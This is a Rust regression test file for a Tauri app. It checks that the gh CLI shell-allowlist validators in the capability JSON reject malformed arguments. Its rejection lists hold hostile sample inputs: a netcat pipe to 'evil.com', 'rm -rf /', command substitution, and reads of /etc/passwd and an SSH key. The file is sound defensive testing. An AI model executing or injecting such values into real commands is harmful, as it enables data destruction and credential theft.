//! Shell allowlist regression tests (B5 §6.2 hardening).
//!
//! Per PR #6 cycle-1 review F2 (P1 security validated HIGH) and cycle-2
//! reviews N6 + N28 (P2 testing-coverage consensus MEDIUM):
//!
//! The Tauri capability config in `capabilities/default.json` declares the
//! allowed gh CLI invocation patterns. `tauri-plugin-shell` v2.3.5 enforces
//! arg-by-arg matching: a fixed string MUST match exactly; a `validator`
//! regex MUST match the incoming arg in that position. If the incoming
//! invocation has FEWER args than the allowlist requires, the plugin returns
//! `Error::MissingVar` (rejected, see `tauri-plugin-shell-2.3.5` scope.rs
//! lines 270-289). If the incoming invocation has MORE args than declared,
//! the EXTRA args are silently dropped (only the validated count is forwarded
//! to the subprocess) — equivalent to "command malformed, will fail at gh
//! exit-code". Either way, malformed invocations cannot reach the subprocess
//! with attacker-controlled flags.
//!
//! Cycle-2 N28 fix: this module previously re-declared the validator
//! regexes as Rust constants ("parallel maintenance"). A future contributor
//! who added a JSON-only entry would pass CI without test coverage. Now,
//! every test loads the SAME regex string out of `capabilities/default.json`
//! at test-init via `serde_json`, then exercises it against the documented
//! positive/negative scenarios. The JSON is the single source of truth.
//!
//! The plugin's enforcement *semantic* (under-supply rejected, over-supply
//! dropped) is verified by the integration test in
//! `tests/shell_plugin_contract.rs`. This module focuses on regex shapes.
//!
//! Pinned plugin version: `tauri-plugin-shell = "=2.3.5"` (see Cargo.toml).
//! Behavior change in a future version (rejection vs drop semantic) must
//! trigger a refresh of these tests AND the integration test.

#![cfg(test)]

use regex::Regex;
use serde_json::Value;

const CAPABILITY_JSON: &str = include_str!("../capabilities/default.json");

/// Look up a validator regex by `(command_name, arg_index)` from the
/// production capability JSON. The plugin wraps the user-declared regex
/// with `^...$` (scope.rs:91-99) when `raw=false` (the default), so we
/// apply the same wrapping here. Panics if the entry isn't found or the
/// arg at that index is fixed (not a var) — both are coding errors the
/// test author should fix immediately.
fn validator(command_name: &str, arg_index: usize) -> Regex {
    let parsed: Value = serde_json::from_str(CAPABILITY_JSON)
        .expect("capabilities/default.json must parse as JSON");
    let permissions = parsed["permissions"]
        .as_array()
        .expect("permissions is an array");
    for perm in permissions {
        if perm.get("identifier").and_then(|v| v.as_str()) != Some("shell:allow-execute") {
            continue;
        }
        let allow = perm["allow"]
            .as_array()
            .expect("shell:allow-execute.allow is an array");
        for entry in allow {
            if entry["name"].as_str() != Some(command_name) {
                continue;
            }
            let args = entry["args"]
                .as_array()
                .unwrap_or_else(|| panic!("entry {command_name} has no args array"));
            let arg = args.get(arg_index).unwrap_or_else(|| {
                panic!("entry {command_name} arg index {arg_index} out of range")
            });
            let validator = arg
                .get("validator")
                .and_then(|v| v.as_str())
                .unwrap_or_else(|| {
                    panic!(
                        "entry {command_name} arg index {arg_index} is fixed, not a validator"
                    )
                });
            let raw = arg.get("raw").and_then(|v| v.as_bool()).unwrap_or(false);
            let pattern = if raw {
                validator.to_string()
            } else {
                format!("^{validator}$")
            };
            return Regex::new(&pattern).unwrap_or_else(|e| {
                panic!("validator '{pattern}' for {command_name}[{arg_index}] failed to compile: {e}")
            });
        }
    }
    panic!("no shell:allow-execute entry named '{command_name}' in capability JSON")
}

#[test]
fn pr_number_validator_accepts_legitimate_values() {
    // gh-pr-view-json args[2] is the pr_number validator.
    let re = validator("gh-pr-view-json", 2);
    for ok in ["1", "6", "42", "12345", "9999999999"] {
        assert!(re.is_match(ok), "expected pr_number '{ok}' to match");
    }
    // Same validator is reused at index 2 of gh-pr-edit-body-file and
    // gh-pr-comment-body-file. Confirm parity (regression: a future JSON
    // edit could diverge them silently).
    let re_edit = validator("gh-pr-edit-body-file", 2);
    let re_comment = validator("gh-pr-comment-body-file", 2);
    assert_eq!(re.as_str(), re_edit.as_str(), "pr_number must be uniform across entries");
    assert_eq!(re.as_str(), re_comment.as_str(), "pr_number must be uniform across entries");
}

#[test]
fn pr_number_validator_rejects_malformed_and_traversal() {
    let re = validator("gh-pr-view-json", 2);
    for bad in [
        "0",
        "-1",
        "01",
        "1.5",
        "1e2",
        "../1",
        " 1",
        "1 ",
        "1;rm",
        "1\n2",
        "1\0",
        "10000000000",
        "",
        "1&2",
    ] {
        assert!(!re.is_match(bad), "expected pr_number '{bad}' to be rejected");
    }
}

#[test]
fn json_fields_validator_accepts_legitimate_field_lists() {
    // gh-pr-view-json args[4] is the json fields validator.
    let re = validator("gh-pr-view-json", 4);
    for ok in ["url", "url,state", "title,body,state,author", "nameWithOwner"] {
        assert!(re.is_match(ok), "expected json fields '{ok}' to match");
    }
    // gh-pr-list-json args[3] reuses the same validator. Confirm parity.
    let re_list = validator("gh-pr-list-json", 3);
    assert_eq!(re.as_str(), re_list.as_str(), "json_fields validator must be uniform");
}

#[test]
fn json_fields_validator_rejects_path_traversal_and_metachars() {
    let re = validator("gh-pr-view-json", 4);
    for bad in [
        "../etc/passwd",
        "url;cat /etc/passwd",
        "url|nc evil.com 9000",
        "url state",
        "url\nstate",
        "url\0state",
        "url/state",
        "url`whoami`",
        "$(whoami)",
        "",
        // 257 chars exceeds the 256 cap.
        &"a".repeat(257),
        // Cycle-2 N3: pure-comma / leading-comma strings are now rejected by
        // the tightened validator (must start with [a-zA-Z0-9_]).
        ",",
        ",,,,,,,",
        ",url",
    ] {
        assert!(
            !re.is_match(bad),
            "expected json fields '{bad}' to be rejected"
        );
    }
}

#[test]
fn body_file_validator_accepts_basenames() {
    // gh-pr-edit-body-file args[4] is the body-file validator.
    let re = validator("gh-pr-edit-body-file", 4);
    for ok in [
        "post-to-pr-body.md",
        "draft.json",
        "trail_review.md",
        "01ARZ3NDEKTSV4RRFFQ69G5FAV.md",
    ] {
        assert!(re.is_match(ok), "expected body-file '{ok}' to match");
    }
    // gh-pr-comment-body-file args[4] reuses the same validator.
    let re_comment = validator("gh-pr-comment-body-file", 4);
    assert_eq!(re.as_str(), re_comment.as_str(), "body_file validator must be uniform");
}

#[test]
fn body_file_validator_rejects_traversal_and_absolute_paths() {
    let re = validator("gh-pr-edit-body-file", 4);
    for bad in [
        "../../../etc/passwd",
        "/etc/passwd",
        "~/.ssh/id_ed25519",
        ".trail/sessions/foo/../../../etc/passwd",
        "draft.md;rm -rf /",
        "draft\nrm.md",
        "draft\0.md",
        "subdir/draft.md",
        "C:\\Windows\\System32",
        "..",
        ".",
        "",
        &"a".repeat(129),
        // Cycle-2 N2: extensionless basenames now rejected (must end in
        // .<alphanumeric>{1,4}). gh's --body-file is documented to take a
        // path to a Markdown/text body; an extensionless basename is highly
        // unusual and an over-permissive surface.
        "extensionless",
        "6",
        "draft",
        "1234567",
        // Extension only / empty extension.
        "draft.",
        ".md",
    ] {
        assert!(!re.is_match(bad), "expected body-file '{bad}' to be rejected");
    }
}

#[test]
fn limit_validator_accepts_legitimate_values() {
    // gh-pr-list-json args[5] is the limit validator.
    let re = validator("gh-pr-list-json", 5);
    for ok in ["1", "5", "50", "999"] {
        assert!(re.is_match(ok), "expected limit '{ok}' to match");
    }
}

#[test]
fn limit_validator_rejects_overflow_and_traversal() {
    let re = validator("gh-pr-list-json", 5);
    for bad in ["0", "1000", "01", "-1", "../1", " 1", "1;", "1000000"] {
        assert!(!re.is_match(bad), "expected limit '{bad}' to be rejected");
    }
}

#[test]
fn api_pulls_path_validator_accepts_legitimate_owner_repo_pulls() {
    // gh-api-pulls-get args[1] is the api-pulls path validator.
    let re = validator("gh-api-pulls-get", 1);
    for ok in [
        "repos/synaptiai/trail/pulls/6",
        "repos/owner/repo/pulls/1",
        "repos/Some-Org/some.repo/pulls/12345",
        "repos/a/b/pulls/1",
        "repos/owner-with-dash/repo_with_under/pulls/9999999999",
    ] {
        assert!(re.is_match(ok), "expected api-pulls path '{ok}' to match");
    }
}

#[test]
fn api_pulls_path_validator_rejects_directory_traversal() {
    let re = validator("gh-api-pulls-get", 1);
    for bad in [
        // Directory traversal at every segment.
        "repos/../../etc/passwd",
        "repos/owner/../etc/pulls/1",
        "repos/owner/repo/pulls/../1",
        "repos/owner/repo/pulls/1/../2",
        // Leading dot in owner/repo segments (could be `..`).
        "repos/.hidden/repo/pulls/1",
        "repos/owner/.hidden/pulls/1",
        // Leading slash (absolute path attempt).
        "/repos/owner/repo/pulls/1",
        "repos//repo/pulls/1",
        "repos/owner//pulls/1",
        // Tilde expansion attempt.
        "~/.ssh/id_ed25519",
        // Embedded shell metacharacters.
        "repos/owner;rm/repo/pulls/1",
        "repos/owner/repo/pulls/1;ls",
        "repos/owner|nc/repo/pulls/1",
        "repos/owner/repo/pulls/1`whoami`",
        // Embedded control characters.
        "repos/owner\n/repo/pulls/1",
        "repos/owner/repo\0/pulls/1",
        // Wrong path shape.
        "users/owner/repo/pulls/1",
        "repos/owner/repo/issues/1",
        // pr_number = 0 / leading zero / overflow.
        "repos/owner/repo/pulls/0",
        "repos/owner/repo/pulls/01",
        "repos/owner/repo/pulls/10000000000",
    ] {
        assert!(
            !re.is_match(bad),
            "expected api-pulls path '{bad}' to be rejected"
        );
    }
}

#[test]
fn fixed_command_args_match_capability_json() {
    // The previous version of this test was a tautology (cycle-2 N28). Now
    // it asserts the JSON-declared fixed args match the canonical Sprint 4-5
    // invocations: if a future JSON edit changes the fixed args, the test
    // fails and the developer must justify the intent.
    let parsed: Value = serde_json::from_str(CAPABILITY_JSON).unwrap();
    let permissions = parsed["permissions"].as_array().unwrap();
    let mut found_auth = false;
    let mut found_repo_view = false;
    for perm in permissions {
        if perm.get("identifier").and_then(|v| v.as_str()) != Some("shell:allow-execute") {
            continue;
        }
        for entry in perm["allow"].as_array().unwrap() {
            let name = entry["name"].as_str().unwrap();
            let args: Vec<&str> = entry["args"]
                .as_array()
                .unwrap()
                .iter()
                .filter_map(|v| v.as_str())
                .collect();
            if name == "gh-auth-status" {
                assert_eq!(args, vec!["auth", "status"], "gh-auth-status canonical form");
                found_auth = true;
            }
            if name == "gh-repo-view-json" {
                assert_eq!(
                    args,
                    vec!["repo", "view", "--json", "nameWithOwner"],
                    "gh-repo-view-json canonical form"
                );
                found_repo_view = true;
            }
        }
    }
    assert!(found_auth, "gh-auth-status missing from capability JSON");
    assert!(found_repo_view, "gh-repo-view-json missing from capability JSON");
}

/// Exercises the shape of every legitimate Sprint 4-5 gh invocation against
/// its capability JSON entry. The validators are loaded from the JSON, so
/// this is no longer parallel maintenance — it's an end-to-end smoke test
/// of the JSON itself. Cycle-2 N28 fix.
#[test]
fn end_to_end_invocations_match_capability_json() {
    // gh pr view 6 --json url,state,title,body
    {
        assert!(validator("gh-pr-view-json", 2).is_match("6"));
        assert!(validator("gh-pr-view-json", 4).is_match("url,state,title,body"));
    }
    // gh pr list --json url,state --limit 50
    {
        assert!(validator("gh-pr-list-json", 3).is_match("url,state"));
        assert!(validator("gh-pr-list-json", 5).is_match("50"));
    }
    // gh pr edit 6 --body-file post-to-pr-body.md
    {
        assert!(validator("gh-pr-edit-body-file", 2).is_match("6"));
        assert!(validator("gh-pr-edit-body-file", 4).is_match("post-to-pr-body.md"));
    }
    // gh pr comment 6 --body-file post-to-pr-comment.md
    {
        assert!(validator("gh-pr-comment-body-file", 2).is_match("6"));
        assert!(validator("gh-pr-comment-body-file", 4).is_match("post-to-pr-comment.md"));
    }
    // gh api repos/synaptiai/trail/pulls/6
    {
        assert!(validator("gh-api-pulls-get", 1).is_match("repos/synaptiai/trail/pulls/6"));
    }
}
